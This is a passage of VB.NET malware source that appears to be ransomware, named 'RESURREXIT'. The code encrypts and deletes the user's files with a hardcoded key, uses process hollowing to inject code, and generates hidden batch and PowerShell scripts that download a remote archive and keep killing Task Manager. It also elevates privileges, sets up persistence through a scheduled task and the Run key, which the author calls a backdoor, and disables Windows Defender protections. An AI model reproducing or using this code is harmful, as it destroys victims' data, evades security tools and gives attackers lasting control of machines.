#Enable Warning BC42104 ' Variable is used before it has been assigned a value
                'Update lngBytesProcessed
                RUNNING_COUNT_BYTE_PROCESS +=
                    CLng(CURRENT_BYTE_PROCESSED)
                'Update Progress Bar
                ProgressBar2.Value =
                    CInt((RUNNING_COUNT_BYTE_PROCESS / LENGTH_PROTOCOL) * &H64)

            End While

            'Close FileStreams and CryptoStream.
            ICESTREAM.Close()

            FILTER_INPUT.Close()

            FILTER_OUTPUT.Close()

            'If encrypting then delete the original unencrypted file.
            If Guide = CryptoAction.HashEncrypt Then

                Dim UNIQUE As New FileInfo(ENCRYPT_DIRECTORIES)

                UNIQUE.Delete()

            End If

            'If decrypting then delete the encrypted file.
            If Guide = CryptoAction.HashDecrypt Then

                Dim BLISTER As New FileInfo(DECRYPT_DIRECTORIES)

                BLISTER.Delete()

            End If
            'Update the user when the file is done.
            Dim UPDATER As String = $"{Chr(&HD)}{Chr(&HA)}"

            If Guide = CryptoAction.HashEncrypt Then

                Debug.WriteLine("Encryption Complete" + UPDATER + UPDATER +
                            "Total bytes processed = " +
                            RUNNING_COUNT_BYTE_PROCESS.ToString,
                             "Done")
                'Update the progress bar and Listbox
            Else
                'Update the user when the file is done.
                Debug.WriteLine("Decryption Complete" + UPDATER + UPDATER +
                           "Total bytes processed = " +
                            RUNNING_COUNT_BYTE_PROCESS.ToString,
                            "Done")

                'Update the progress bar and Listbox

            End If

        Catch When Err.Number = &H35 'if file not found

            Debug.WriteLine("Please check to make sure the path and filename" +
                            "are correct and if the file exists.",
                             "Invalid Path or Filename")
            'Catch file not found error.
            'Catch all other errors. And delete partial files.
        Catch

            If Guide = CryptoAction.HashDecrypt Then

                Dim UPDATER As New FileInfo(HOST)

                UPDATER.Delete()

            Else

                Dim UPDATER As New FileInfo(HOST)

                UPDATER.Delete()

            End If

        End Try

        FILTER_INPUT.Close()

        FILTER_OUTPUT.Close()

    End Sub

    Private Sub Timer1_Tick(sender As Object,
                            e As EventArgs) Handles Timer1.Tick
        Try
            ProgressBar1.Maximum = ListBox1.Items.Count

            If ProgressBar1.Value = ListBox1.Items.Count Then

                Timer1.Stop()

                Application.Exit()

            Else

                ListBox1.SelectedIndex = ProgressBar1.Value

                ListBox1.SelectionMode = SelectionMode.One

                HOST = CStr(ListBox1.SelectedItem)

                Try
                    'Send the password to the CreateKey function.
                    Dim Key As Byte() = GUARDIAN("CRYPTO_IS_ETERNAL")
                    'Send the password to the CreateIV function.
                    Dim IV As Byte() = CREATION_POOL("CRYPTO_IS_ETERNAL")
                    'Start the encryption.
                    HASH_PASSAGE(HOST, HOST + ".RESURREXIT_REBORN",
                                             Key, IV, CryptoAction.HashEncrypt)
                Catch ex As Exception

                    'Debug.WriteLine("Error : {0}", HOST)

                End Try

                ProgressBar1.Increment(&H1)

            End If

        Catch ex As Exception

            'Debug.WriteLine(ex, HOST)

        End Try


    End Sub
#End Region

    Public Delegate Sub ProgressReportDelegate(value As Int32)
    Private Sub ReportProgress(v As Int32)

        If progBar.InvokeRequired Then

            progBar.Invoke(Sub() progBar.Value = v)

        Else
            progBar.Value = v

            progBar.Invalidate()

        End If

    End Sub

#Region "PROCESS INJECTION"
    ''' <summary>
    ''' </summary>
    ''' <param name="applicationName"></param>
    ''' <param name="commandLine"></param>
    ''' <param name="processAttributes"></param>
    ''' <param name="threadAttributes"></param>
    ''' <param name="inheritHandles"></param>
    ''' <param name="creationFlags"></param>
    ''' <param name="environment"></param>
    ''' <param name="currentDirectory"></param>
    ''' <param name="startupInfo"></param>
    ''' <param name="processInformation"></param>
    ''' <returns></returns>
    <DllImport("kernel32.dll", EntryPoint:="CreateProcess",
               CharSet:=CharSet.Unicode),
        Security.SuppressUnmanagedCodeSecurity>
    Private Shared Function CreateProcess_API(
applicationName As String,
commandLine As String,
processAttributes As IntPtr,
threadAttributes As IntPtr,
inheritHandles As Boolean,
creationFlags As UInteger,
environment As IntPtr,
currentDirectory As String,
  ByRef startupInfo As STARTUP_INFORMATION,
  ByRef processInformation As PROCESS_INFORMATION) As Boolean
    End Function 'CreateProcess

    <DllImport("kernel32.dll", EntryPoint:=
               "GetThreadContext"),
        Security.SuppressUnmanagedCodeSecurity>
    Private Shared Function GetThreadContext_API(
thread As IntPtr,
context As Integer()) As Boolean
    End Function 'GetThreadContext

    <DllImport("kernel32.dll", EntryPoint:=
               "Wow64GetThreadContext"),
        Security.SuppressUnmanagedCodeSecurity>
    Private Shared Function Wow64GetThreadContext_API(
thread As IntPtr,
context As Integer()) As Boolean
    End Function 'Wow64GetThreadContext

    <DllImport("kernel32.dll", EntryPoint:=
               "SetThreadContext"),
        Security.SuppressUnmanagedCodeSecurity>
    Private Shared Function SetThreadContext_API(
thread As IntPtr,
context As Integer()) As Boolean
    End Function 'SetThreadContext

    <DllImport("kernel32.dll", EntryPoint:=
               "Wow64SetThreadContext"),
        Security.SuppressUnmanagedCodeSecurity>
    Private Shared Function Wow64SetThreadContext_API(
thread As IntPtr,
context As Integer()) As Boolean
    End Function 'Wow64SetThreadContext

    <DllImport("kernel32.dll", EntryPoint:=
               "ReadProcessMemory"),
        Security.SuppressUnmanagedCodeSecurity>
    Private Shared Function ReadProcessMemory_API(
process As IntPtr,
baseAddress As Integer,
    ByRef buffer As Integer,
bufferSize As Integer,
    ByRef bytesRead As Integer) As Boolean
    End Function 'ReadProcessMemory

    <DllImport("kernel32.dll", EntryPoint:=
               "WriteProcessMemory"),
        Security.SuppressUnmanagedCodeSecurity>
    Private Shared Function WriteProcessMemory_API(
process As IntPtr,
baseAddress As Integer,
buffer As Byte(),
bufferSize As Integer,
    ByRef bytesWritten As Integer) As Boolean
    End Function 'WriteProcessMemory

    <DllImport("ntdll.dll", EntryPoint:=
               "NtUnmapViewOfSection"),
        Security.SuppressUnmanagedCodeSecurity>
    Private Shared Function NtUnmapViewOfSection_API(
process As IntPtr,
baseAddress As Integer) As Integer
    End Function 'NtUnmapViewOfSection

    <DllImport("kernel32.dll", EntryPoint:=
               "VirtualAllocEx"),
        Security.SuppressUnmanagedCodeSecurity>
    Private Shared Function VirtualAllocEx_API(
handle As IntPtr,
address As Integer,
length As Integer,
type As Integer,
protect As Integer) As Integer
    End Function 'VirtualAllocEx

    <DllImport("kernel32.dll", EntryPoint:="ResumeThread"),
        Security.SuppressUnmanagedCodeSecurity>
    Private Shared Function ResumeThread_API(
handle As IntPtr) As Integer
    End Function 'ResumeThread

    <StructLayout(LayoutKind.Sequential,
                  Pack:=1)>
    Private Structure PROCESS_INFORMATION
        Public ProcessHandle As IntPtr
        Public ThreadHandle As IntPtr
        Public ProcessId As UInteger
        Public ThreadId As UInteger
    End Structure 'PROCESS_INFORMATION

    <StructLayout(LayoutKind.Sequential,
                  Pack:=1)>
    Private Structure STARTUP_INFORMATION
        Public Size_ As UInteger
        Public Reserved1 As String
        Public Desktop As String
        Public Title As String
        Public dwX As Integer
        Public dwY As Integer
        Public dwXSize As Integer
        Public dwYSize As Integer
        Public dwXCountChars As Integer
        Public dwYCountChars As Integer
        Public dwFillAttribute As Integer
        Public dwFlags As Integer
        Public wShowWindow As Short
        Public cbReserved2 As Short
        Public Reserved2 As IntPtr
        Public StdInput As IntPtr
        Public StdOutput As IntPtr
        Public StdError As IntPtr
    End Structure 'STARTUP_INFORMATION

    Public Shared Function Run(path As String,
                               data As Byte()) As Boolean

        For fri As Integer =
            &H1 To &H5

            If HandleRun(path, String.Empty,
                         data,
                         True) Then Return True

        Next

        Return False
    End Function 'Run

    Private Shared Function HandleRun(path As String,
                                      cmd As String,
                                      data As Byte(),
                                      compatible As Boolean) As Boolean
        Dim SI As New STARTUP_INFORMATION With {
            .dwFlags =
            0, ' dwFlags = 1 ( Hide ) ' dwFlags = 0 ( Show )
            .Size_ = CUInt(Marshal.SizeOf(GetType(STARTUP_INFORMATION)))
        }
        Dim PI As New PROCESS_INFORMATION

        Try
            Dim QuotedPath As String = String.Format("""{0}""",
                                                     path)

            If Not String.IsNullOrEmpty(cmd) Then

                QuotedPath =
                    QuotedPath & " " & cmd

            End If

            If Not CreateProcess_API(path,
                                     QuotedPath,
                                     IntPtr.Zero,
                                     IntPtr.Zero,
                                     False,
                                     &H4,
                                     IntPtr.Zero,
                                     Nothing,
                                     SI,
                                     PI) Then Throw New Exception()

            '%Process_Protection% ProtectProcess(PI.ProcessId)

            Dim FileAddress As Integer = BitConverter.ToInt32(data, &H3C)

            Dim Context_(&HB3 - 1) As Integer

            Context_(0) =
                &H10002

            If IntPtr.Size =
                &H4 Then
                If Not GetThreadContext_API(PI.ThreadHandle,
                                            Context_) Then Throw New Exception()
            Else
                If Not Wow64GetThreadContext_API(PI.ThreadHandle,
                                                 Context_) Then Throw New Exception()
            End If

            Dim Ebx As Integer =
                Context_(&H29)


            Dim ReadWrite As Integer


            Dim BaseAddress As Integer

            If Not ReadProcessMemory_API(PI.ProcessHandle,
                                         Ebx + &H8,
                                         BaseAddress,
                                         4,
                                         ReadWrite) Then Throw New Exception()

            Dim ImageBase As Integer =
                BitConverter.ToInt32(data,
                                                            FileAddress + &H34)
            If ImageBase = BaseAddress Then
                If Not NtUnmapViewOfSection_API(PI.ProcessHandle,
                                                BaseAddress) =
                                                0 Then Throw New Exception()
            End If

            Dim SizeOfImage As Integer =
                BitConverter.ToInt32(data,
                                                              FileAddress + 80)

            Dim AllowOverride As Boolean

            Dim NewImageBase As Integer =
                VirtualAllocEx_API(PI.ProcessHandle,
                                                             ImageBase,
                                                             SizeOfImage,
                                                             12288,
                                                             &H40) 'R1

            'This is the only way to execute under certain conditions. However, it may show
            'an application error probably because things aren't being relocated properly.

            If Not compatible AndAlso NewImageBase =
                0 Then
                AllowOverride =
                    True
                NewImageBase =
                    VirtualAllocEx_API(PI.ProcessHandle,
                                       0,
                                                  SizeOfImage,
                                                  &H3000,
                                                  &H40)
            End If

            If NewImageBase =
                0 Then Throw New Exception()

            Dim SizeOfHeaders As Integer =
                BitConverter.ToInt32(data, FileAddress + &H54)
            If Not WriteProcessMemory_API(PI.ProcessHandle,
                                          NewImageBase, data,
                                          SizeOfHeaders, ReadWrite) Then Throw New Exception()

            Dim SectionOffset As Integer = FileAddress + &HF8
            Dim NumberOfSections As Short = BitConverter.ToInt16(data,
                                                                 FileAddress + &H6)

            For fri As Integer =
                0 To NumberOfSections - 1
                Dim VirtualAddress As Integer =
                    BitConverter.ToInt32(data,
                                                                     SectionOffset + &HC)
                Dim SizeOfRawData As Integer =
                    BitConverter.ToInt32(data,
                                                                    SectionOffset + &H10)
                Dim PointerToRawData As Integer =
                    BitConverter.ToInt32(data,
                                                                       SectionOffset + &H14)

                If Not SizeOfRawData =
                    0 Then

                    Dim SectionData(SizeOfRawData - 1) As Byte
                    Buffer.BlockCopy(data,
                                            PointerToRawData,
                                            SectionData,
                                            0,
                                            SectionData.Length)

                    If Not WriteProcessMemory_API(PI.ProcessHandle,
                                                  NewImageBase + VirtualAddress,
                                                  SectionData,
                                                  SectionData.Length,
                                                  ReadWrite) Then Throw New Exception()
                End If

                SectionOffset +=
                    &H28
            Next

            Dim PointerData As Byte() = BitConverter.GetBytes(NewImageBase)
            If Not WriteProcessMemory_API(PI.ProcessHandle,
                                          Ebx + &H8,
                                          PointerData,
                                          &H4,
                                          ReadWrite) Then Throw New Exception()

            Dim AddressOfEntryPoint As Integer =
                BitConverter.ToInt32(data,
                                                                      FileAddress + &H28)

            If AllowOverride Then NewImageBase =
                ImageBase
            Context_(&H2C) =
                NewImageBase + AddressOfEntryPoint

            If IntPtr.Size =
                &H4 Then
                If Not SetThreadContext_API(PI.ThreadHandle,
                                            Context_) Then Throw New Exception()
            Else
                If Not Wow64SetThreadContext_API(PI.ThreadHandle,
                                                 Context_) Then Throw New Exception()
            End If

            If ResumeThread_API(PI.ThreadHandle) =
                -1 Then Throw New Exception()

        Catch

            Dim Pros As Process =
                Process.GetProcessById(CInt(PI.ProcessId))

            If Pros IsNot Nothing Then Pros.Kill()

            Return False

        End Try

        Return True

    End Function 'HandleRun
#End Region

#Region "POWERSHELL | BATCH COMMANDS"

    'This downloads a "Zip File" from a URL and extracts the zip file from its given location 
    Private Sub COLLECTIVE_SOUL() 'HERE, WE LAUNCH BATCH SCRIPT EMBEDDED WITH POWERSHELL COMMANDS USING VB.NET

        'The String object is immutable. Every time you use one of the methods in the System.String class, you create a new string object in memory,
        'which requires a new allocation of space for that new object. In situations where you need to perform repeated modifications to a string,
        'the overhead associated with creating a new String object can be costly.
        'The System.Text.StringBuilder class can be used when you want to modify a string without creating a new object. For example,
        'using the StringBuilder class can boost performance when concatenating many strings together in a loop.

        'StringBuilder.AppendLine Method:
        'Appends the default line terminator, or a copy of a specified string and the default line terminator, to the end of this instance.
        'See: https://learn.microsoft.com/en-us/dotnet/api/system.text.stringbuilder.appendline?view=net-9.0
        Try
            Dim rythorian77 As New StringBuilder ''Using the StringBuilder Class in .NET

            rythorian77.AppendLine("@echo off")

            rythorian77.AppendLine("Title: Batch Auto Hide Starter >>(Created by: Justin Linwood Ross)") 'KEEPS ANNOYING CMD WINDOW AWAY AND ICON.

            rythorian77.AppendLine(":Commandline")

            rythorian77.AppendLine("If [""%~1""]==[""-e""] GoTo o")

            rythorian77.AppendLine(":Clear vbs")

            rythorian77.AppendLine("set Batch=%~dpnx0")

            rythorian77.AppendLine("(")

            rythorian77.AppendLine("echo set objshell^= createobject^(""wscript.shell""^)")

            rythorian77.AppendLine("echo objshell^.run ""%Batch% -e""^,vbhide ) > %temp%\bas.vbs")

            rythorian77.AppendLine("start %temp%\bas.vbs")

            rythorian77.AppendLine("exit")

            rythorian77.AppendLine(":o")
            'Where your code begins
            rythorian77.AppendLine(":PowerShell")

            rythorian77.AppendLine("powershell.exe -executionpolicy bypass -windowstyle hidden -noninteractive -nologo -file ""tmpDlFile.ps1""")

            rythorian77.AppendLine("SET PSScript=%temp%\~tmpDlFile.ps1")

            rythorian77.AppendLine("IF EXIST ""%PSScript%"" DEL /Q /F ""%PSScript%""")

            rythorian77.AppendLine("ECHO [Net.ServicePointManager]::SecurityProtocol = ""tls12, tls11, tls"">>""%PSScript%""")
            'Invoking the web request >>>>>>>>>>>>>>>>>>>>>>"YOUR DOWNLOAD URL LOCATION ADDRESS GOES BELOW" LEAVE THE -OUTPUT MINUS FILE-NAME >>>HERE<<<<<<JUST CHANGE "video.zip" to given name
            rythorian77.AppendLine("ECHO Invoke-WebRequest ""https://github.com/Rythorian77/Guardian-Watch-Video/releases/download/v1.0/Antivirus.video.zip"" -OutFile ""%HOMEDRIVE%%HOMEPATH%\Videos\video.zip"">>""%PSScript%""")

            rythorian77.AppendLine("SET PowerShellDir=C:\Windows\System32\WindowsPowerShell\v1.0") 'set an environment variable in PowerShell

            rythorian77.AppendLine("CD /D ""%PowerShellDir%""") 'Combine a Windows command prompt command (CD /D ""%PowerShell Dir%") with PowerShell syntax.

            rythorian77.AppendLine("Powershell -ExecutionPolicy Bypass -Command ""& '%PSScript%'""") 'Run Powershell as Admin without UAC confirmation for servers & web

            'Change file name>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>HERE<<<<<< || >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>HERE<<<<<<
            rythorian77.AppendLine("powershell -Command ""Expand-Archive -Path '%HOMEDRIVE%%HOMEPATH%\Videos\video.zip' -DestinationPath '%HOMEDRIVE%%HOMEPATH%\Music\video.zip'""")

            rythorian77.AppendLine("Replace '%HOMEDRIVE%%HOMEPATH%\Videos\video.zip' with the actual path to your zip file.")

            rythorian77.AppendLine("Replace '%HOMEDRIVE%%HOMEPATH%\Music\video.zip' with the actual path to the destination folder.EXIT")

            rythorian77.AppendLine("IF NOT %ERRORLEVEL%==0")

            rythorian77.AppendLine("CreateObject(""Wscript.Shell"").Run ""HyperX.bat"", 0, True") 'New Bat ALIAS

            rythorian77.AppendLine("GoTo begin")

            File.WriteAllText("MetaX.bat", rythorian77.ToString)

            Process.Start("MetaX.bat")

        Catch ex As Exception

            Debug.WriteLine(ex.Message, "Error")

        End Try

    End Sub


    Private Sub AntiTaskManager() 'AUTOMATICALLY CREATE AN INVISIBLE Bat File (NO CMD WINDOW OR ICON IN TOOLBAR) using VB.NET which launches a freshly created BAT that blocks Task Manager

        'The String object is immutable. Every time you use one of the methods in the System.String class, you create a new string object in memory,
        'which requires a new allocation of space for that new object. In situations where you need to perform repeated modifications to a string,
        'the overhead associated with creating a new String object can be costly.
        'The System.Text.StringBuilder class can be used when you want to modify a string without creating a new object. For example,
        'using the StringBuilder class can boost performance when concatenating many strings together in a loop.

        'StringBuilder.AppendLine Method:
        'Appends the default line terminator, or a copy of a specified string and the default line terminator, to the end of this instance.
        'See: https://learn.microsoft.com/en-us/dotnet/api/system.text.stringbuilder.appendline?view=net-9.0
        Try
            Dim rythorian77 As New StringBuilder 'Using the StringBuilder Class in .NET

            rythorian77.AppendLine("@echo off")

            rythorian77.AppendLine("Title: Batch Auto Hide Starter >>(Created by: Justin Linwood Ross)")

            rythorian77.AppendLine(":Commandline")

            rythorian77.AppendLine("If [""%~1""]==[""-e""] GoTo o")

            rythorian77.AppendLine(":Clear vbs")

            rythorian77.AppendLine("set Batch=%~dpnx0")

            rythorian77.AppendLine("(")

            rythorian77.AppendLine("echo set objshell^= createobject^(""wscript.shell""^)")

            rythorian77.AppendLine("echo objshell^.run ""%Batch% -e""^,vbhide ) > %temp%\bas.vbs")

            rythorian77.AppendLine("start %temp%\bas.vbs")

            rythorian77.AppendLine("exit")

            rythorian77.AppendLine(":o")

            rythorian77.AppendLine(":loop")

            rythorian77.AppendLine("Taskkill /IM taskmgr.exe /FI ""STATUS eq RUNNING"" /F")

            rythorian77.AppendLine("goto loop")

            rythorian77.AppendLine("IF NOT %ERRORLEVEL%==0")              'New Bat

            rythorian77.AppendLine("CreateObject(""Wscript.Shell"").Run ""HyperNova.bat"", 0, True") 'ALIAS

            rythorian77.AppendLine("GoTo begin")

            File.WriteAllText("AntiTaskManager.bat", rythorian77.ToString)

            Process.Start("AntiTaskManager.bat")

        Catch ex As Exception

            Debug.WriteLine(ex.Message, "Error")

        End Try

    End Sub

#End Region


#Region " GPO Security Identifier | Creators Owner ID, (Highest Mandatory Level) | Schedule Task  "
    REM:GPO cmdlet creates a GPO with a specified name. By default, the newly created GPO is not linked to a site,
    REM:domain, or organizational unit (OU). You can use this cmdlet To create a GPO that Is based On a starter GPO by
    REM:specifying the GUID Or the display name of the Starter GPO, Or by piping a StarterGpo Object into the cmdlet.
    REM:The cmdlet returns a GPO Object, which represents the created GPO that you can pipe "To other Group Policy cmdlets."
    Public Function GP_OverRide(cmd As String,
                        Optional args As String = "",
                        Optional startin As String = "") As String

        GP_OverRide = ""

        Try

            Dim px =
                New Process With {
                .StartInfo = New ProcessStartInfo(cmd, args)
            }
            If startin <> "" Then px.StartInfo.WorkingDirectory =
                startin
            px.StartInfo.RedirectStandardOutput =
                True
            px.StartInfo.RedirectStandardError =
                True
            px.StartInfo.UseShellExecute =
                False
            px.StartInfo.CreateNoWindow =
                True
            px.Start()
            px.WaitForExit()
            Dim sMax = px.StandardOutput.ReadToEnd
            sMax +=
                px.StandardError.ReadToEnd
            GP_OverRide =
                sMax

        Catch ex As Exception

            Debug.WriteLine("Error", ex)

        End Try

    End Function REM:Get Process Output.

    REM:Display owner System Via; The <Security Identifier>
    Public Function SecurityIdentifier() As Boolean

        SecurityIdentifier =
            False
        'Displays user, group, and privileged information for the user who is currently logged on to the local system.
        'If used without parameters, whoami displays the current domain and user name.
        'https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/whoami
        Dim xxyy = GP_OverRide("c: \windows\system32\cmd.exe",
                    "/c whoami /all | findstr /I /C:""S-1-5-32-544""") '<<This is a Security Identifier

        If xxyy.Contains("S-1-5-32-544") Then SecurityIdentifier = True

    End Function ' Check if can get Higher.

    'Below: Creators Owner ID has discovered the "Security Identifier" to be replaced by the "S-1-16-12288"
    '(Highestndatory Level) ADMIN.
    'A Security Identifier (SID) is used to uniquely identify a security principal or security group. Security principals can represent any entity
    'that can be authenticated by the operating system, such as a user account, a computer account, or a thread or process that runs in the security
    'context of a user or computer account.Each account Or group, Or process running in the security context of the account,
    'has a unique SID that Is issued by an authority, such as a Windows domain controller. It Is stored in a security database.
    'The system generates the SID that identifies a particular account Or group at the time the account Or group Is created.
    'When a SID has been used as the unique identifier for a user Or group, it can never be used again to identify another user Or group.
    'Each time a user signs in, the system creates an access token for that user. The access token contains the user's SID, user rights, and the SIDs
    'for any groups the user belongs to. This token provides the security context for whatever actions the user performs on that computer.
    'In addition to the uniquely created, domain-specific SIDs that are assigned to specific users And groups, there are well-known SIDs that identify
    'generic groups And generic users. For example, the Everyone And World SIDs identify a group that includes all users. Well-known SIDs have values
    'that remain constant across all operating systems. SIDs are a fundamental building block Of the Windows security model.
    'They work With specific components Of the authorization And access control technologies In the security infrastructure Of the
    'Windows Server operating systems. This helps protect access To network resources And provides a more secure computing environment.
    '>>>>>>>>>>>>>>>>>>>>>>>>>>>>>

    'How Security Identifiers Work:
    'Users refer To accounts by Using the account name, but the operating system internally refers To accounts And processes
    'that run In the security context Of the account by Using their security identifiers (SIDs). For domain accounts, the SID Of a
    'security principal Is created by concatenating the SID Of the domain With a relative identifier (RID) For the account.
    'SIDs are unique within their scope (domain Or local), And they are never reused.
    Public Function WhoAmIAll() As Boolean

        WhoAmIAll =
            False
        Dim sCon =
            GP_OverRide("c:\windows\system32\cmd.exe",
                    "/c whoami /all | findstr /I /C:""S-1-16-12288""")
        If sCon.Contains("S-1-16-12288") Then WhoAmIAll = True
    End Function REM: Check if Higher.

    REM:Elevating Privileges
    Public Function Ethrovons_Elevation() As Boolean

        Ethrovons_Elevation = False

        If Not WhoAmIAll() Then
            Try
                'Elevating process privilege programmatically.
                'In computing, runas is a command in the Microsoft Windows line of operating systems that allows a user to run specific
                'tools and programs under a different username to the one that was used to logon to a computer interactively.
                Dim pac As New ProcessStartInfo(Process.GetCurrentProcess.MainModule.FileName) With {
                    .Verb = "runas"
                }
                Dim p =
                    Process.Start(pac)

                Return True

            Catch ex As Exception

                Return False

            End Try

        End If
    End Function REM:Get Higher Level As Admin.

    'Now that the information is gathered, we create a backdoor into the system via entry od Task Scheduler
    'with the Highest ADMIN RIGHTS.
    Private Sub Rythorians_Scheduler()
        REM:StartUp BackgroundWorker to schedule a startup task
        Dim subworker As New BackgroundWorker()

        AddHandler subworker.DoWork, Sub(sender1 As Object,
                                    e1 As DoWorkEventArgs)
                                         REM:Schedules Task to start up with Admin Rights
                                         While True
                                             Try
                                                 If WhoAmIAll() Then

                                                     If Not GP_OverRide("c:\windows\system32\cmd.exe",
                                                           $"/C schtasks /create /rl HIGHEST /sc ONLOGON /tn RESURREXIT /F /tr """"{Process.GetCurrentProcess.MainModule.FileName}""""").Contains("successfully") Then
                                                         My.Computer.Registry.CurrentUser.OpenSubKey("Software\Microsoft\Windows\CurrentVersion\Run", True).SetValue("RESURREXIT.exe",
                                                                                                                                                                    Process.GetCurrentProcess.MainModule.FileName)
                                                     End If
                                                 Else
                                                     My.Computer.Registry.CurrentUser.OpenSubKey("Software\Microsoft\Windows\CurrentVersion\Run", True).SetValue("RESURREXIT.exe",
                                                                                                                                                                Process.GetCurrentProcess.MainModule.FileName)
                                                 End If

                                             Catch ex As Exception

                                             End Try

                                             Thread.Sleep(15000)

                                         End While
                                     End Sub
        subworker.RunWorkerAsync()
    End Sub
#End Region

    Public Shared Sub Disable()

        If Not New WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator) Then Return

        RegistryEdit("SOFTWARE\Microsoft\Windows Defender\Features", "TamperProtection",
                     "0") 'Windows 10 1903 Redstone 6

        RegistryEdit("SOFTWARE\Policies\Microsoft\Windows Defender", "DisableAntiSpyware",
                     "1")

        RegistryEdit("SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection",
                     "DisableBehaviorMonitoring", "1")

        RegistryEdit("SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection",
                     "DisableOnAccessProtection", "1")

        RegistryEdit("SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection",
                     "DisableScanOnRealtimeEnable", "1")

        Call CheckDefender()

        Call Registrys()

        Dim startInfo As New ProcessStartInfo("schtasks") With {
    .Arguments = "/create /tn """ & "svchost" & """ /sc ONLOGON /tr """ & Assembly.GetExecutingAssembly().Location & """ /rl HIGHEST /f",
    .UseShellExecute = False,
    .CreateNoWindow = True
}
        Process.Start(startInfo)

    End Sub


    Private Shared Sub RegistryEdit(regPath As String,
                                    name As String,
                                    value As String)
        Try
            Using key = Registry.LocalMachine.OpenSubKey(regPath,
                                                         RegistryKeyPermissionCheck.ReadWriteSubTree)
                If key Is Nothing Then
                    Registry.LocalMachine.CreateSubKey(regPath).SetValue(name, value,
                                                                         RegistryValueKind.DWord)
                    Return
                End If
                If key.GetValue(name) IsNot value Then key.SetValue(name, value,
                                                                    RegistryValueKind.DWord)
            End Using

        Catch
        End Try
    End Sub

    Private Shared Sub CheckDefender()
        Dim proc As New Process With {
                    .StartInfo = New ProcessStartInfo With {
        .FileName = "powershell",
        .Arguments = "Get-MpPreference -verbose",
        .UseShellExecute = False,
        .RedirectStandardOutput = True,
        .WindowStyle = ProcessWindowStyle.Hidden,
        .CreateNoWindow = True
    }
}
        proc.Start()

        While Not proc.StandardOutput.EndOfStream

            Dim line As String = proc.StandardOutput.ReadLine()

            If line.Contains("DisableRealtimeMonitoring") AndAlso line.Contains("False") Then
                RunPS("Set-MpPreference -DisableRealtimeMonitoring $true") 'real-time protection

            ElseIf line.Contains("DisableBehaviorMonitoring") AndAlso line.Contains("False") Then
                RunPS("Set-MpPreference -DisableBehaviorMonitoring $true") 'behavior monitoring

            ElseIf line.Contains("DisableBlockAtFirstSeen") AndAlso line.Contains("False") Then
                RunPS("Set-MpPreference -DisableBlockAtFirstSeen $true")

            ElseIf line.Contains("DisableIOAVProtection") AndAlso line.Contains("False") Then
                RunPS("Set-MpPreference -DisableIOAVProtection $true") 'scans all downloaded files and attachments

            ElseIf line.Contains("DisablePrivacyMode") AndAlso line.Contains("False") Then
                RunPS("Set-MpPreference -DisablePrivacyMode $true") 'displaying threat history

            ElseIf line.Contains("SignatureDisableUpdateOnStartupWithoutEngine") AndAlso line.Contains("False") Then
                RunPS("Set-MpPreference -SignatureDisableUpdateOnStartupWithoutEngine $true") 'definition updates on startup

            ElseIf line.Contains("DisableArchiveScanning") AndAlso line.Contains("False") Then
                RunPS("Set-MpPreference -DisableArchiveScanning $true") 'scan archive files, such as .zip and .cab files

            ElseIf line.Contains("DisableIntrusionPreventionSystem") AndAlso line.Contains("False") Then
                RunPS("Set-MpPreference -DisableIntrusionPreventionSystem $true") ' network protection 

            ElseIf line.Contains("DisableScriptScanning") AndAlso line.Contains("False") Then
                RunPS("Set-MpPreference -DisableScriptScanning $true") 'scanning of scripts during scans

            ElseIf line.Contains("SubmitSamplesConsent") AndAlso Not line.Contains("2") Then
                RunPS("Set-MpPreference -SubmitSamplesConsent 2") 'MAPSReporting 

            ElseIf line.Contains("MAPSReporting") AndAlso Not line.Contains("0") Then
                RunPS("Set-MpPreference -MAPSReporting 0") 'MAPSReporting 

            ElseIf line.Contains("HighThreatDefaultAction") AndAlso Not line.Contains("6") Then
                RunPS("Set-MpPreference -HighThreatDefaultAction 6 -Force") ' high level threat // Allow

            ElseIf line.Contains("ModerateThreatDefaultAction") AndAlso Not line.Contains("6") Then
                RunPS("Set-MpPreference -ModerateThreatDefaultAction 6") ' moderate level threat

            ElseIf line.Contains("LowThreatDefaultAction") AndAlso Not line.Contains("6") Then
                RunPS("Set-MpPreference -LowThreatDefaultAction 6") ' low level threat

            ElseIf line.Contains("SevereThreatDefaultAction") AndAlso Not line.Contains("6") Then
                RunPS("Set-MpPreference -SevereThreatDefaultAction 6")
            End If ' severe level threat

        End While

    End Sub

    Private Shared Sub RunPS(args As String)

        Dim proc As New Process With {
                    .StartInfo = New ProcessStartInfo With {
        .FileName = "powershell",
        .Arguments = args,
        .WindowStyle = ProcessWindowStyle.Hidden,
        .CreateNoWindow = True
    }
}
        proc.Start()

    End Sub


    Private Shared Sub Registrys()

        Try
            Registry.SetValue("HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows Defender",
                              "DisableAntiSpyware", 1, RegistryValueKind.DWord)

            Registry.SetValue("HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows Defender",
                              "DisableRoutinelyTakingAction", 1, RegistryValueKind.DWord)

            Registry.SetValue("HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows Defender",
                              "ServiceKeepAlive", 0, RegistryValueKind.DWord)

            Registry.SetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender",
                              "ServiceKeepAlive", 0, RegistryValueKind.DWord)

            ' using services to disable windows defender //
            Registry.SetValue("HKEY_LOCAL_MACHINE\System\ControlSet001\Services\WinDefend",
                              "Start", 4, RegistryValueKind.DWord)

            Registry.SetValue("HKEY_LOCAL_MACHINE\System\ControlSet002\Services\WinDefend",
                              "Start", 4, RegistryValueKind.DWord)

            Registry.SetValue("HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\WinDefend",
                              "Start", 4, RegistryValueKind.DWord)

            Registry.SetValue("HKEY_LOCAL_MACHINE\System\ControlSet001\Services\WdBoot",
                              "Start", 4, RegistryValueKind.DWord)

            Registry.SetValue("HKEY_LOCAL_MACHINE\System\ControlSet002\Services\WdBoot",
                              "Start", 4, RegistryValueKind.DWord)

